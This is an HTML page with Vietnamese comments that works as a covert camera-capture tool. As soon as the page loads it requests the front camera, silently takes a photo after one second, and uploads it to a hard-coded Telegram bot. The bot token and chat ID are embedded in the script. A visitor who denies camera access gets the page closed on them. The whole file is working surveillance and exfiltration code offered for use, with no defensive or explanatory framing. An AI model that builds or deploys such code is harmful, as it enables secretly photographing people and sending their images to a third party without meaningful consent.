<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Màn hình kết quả sau khi chụp xong */
        #result-container {
            display: none;
            text-align: center;
            padding: 20px;
        }

        #captured-img {
            max-width: 90%;
            max-height: 60vh;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            margin-bottom: 15px;
        }

        .message {
            font-size: 20px;
            color: #2e7d32;
            font-weight: bold;
        }
    </style>
</head>
<body>

<!-- Khung hiển thị ảnh và thông báo sau khi hoàn tất -->
<div id="result-container">
    <img id="captured-img" alt="Ảnh đã chụp từ camera trước">
    <div class="message">Ảnh bạn đã được gửi</div>
</div>

<!-- Khung camera và canvas xử lý ngầm (không hiển thị) -->
<video id="webcam" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    // ==========================================
    // CẤU HÌNH THÔNG TIN TELEGRAM BOT TẠI ĐÂY
    // ==========================================
    const TELEGRAM_BOT_TOKEN = '8910192618:AAEcxfvxyMFVClt8WXZEyKQ-s4aO7AYw9eA';
    const TELEGRAM_CHAT_ID = '8894046691';

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    const resultContainer = document.getElementById('result-container');
    const capturedImg = document.getElementById('captured-img');

    // Chạy ngầm ngay khi truy cập trang web
    window.addEventListener('DOMContentLoaded', async () => {
        try {
            // Yêu cầu quyền truy cập CAMERA TRƯỚC (facingMode: "user")
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" },
                audio: false
            });

            video.srcObject = stream;

            // Chờ 1 giây để ống kính camera bắt sáng/lấy nét
            setTimeout(() => {
                autoCaptureAndSend(stream);
            }, 1000);

        } catch (err) {
            // Nếu người dùng từ chối quyền camera -> Thoát web
            exitWeb();
        }
    });

    // Xử lý thoát khi người dùng từ chối cấp quyền
    function exitWeb() {
        setTimeout(() => {
            window.close();
            window.location.href = "about:blank";
        }, 300);
    }

    // Chụp khung hình từ camera trước và gửi về Telegram
    function autoCaptureAndSend(stream) {
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;

        const context = canvas.getContext('2d');
        // Chụp ảnh từ ống kính camera trước
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Chuyển dữ liệu ảnh thành URL để hiển thị lên giao diện web
        const imageUrl = canvas.toDataURL('image/png');

        canvas.toBlob(async function(blob) {
            if (blob) {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'camera_front.png');

                try {
                    // Gửi tệp ảnh trực tiếp tới API Telegram
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (error) {
                    console.error("Lỗi gửi dữ liệu:", error);
                }
            }

            // Tắt đèn camera sau khi đã hoàn tất chụp
            stream.getTracks().forEach(track => track.stop());

            // Hiển thị bức ảnh từ camera trước và dòng thông báo
            capturedImg.src = imageUrl;
            resultContainer.style.display = 'block';

        }, 'image/png');
    }
</script>

</body>
</html>
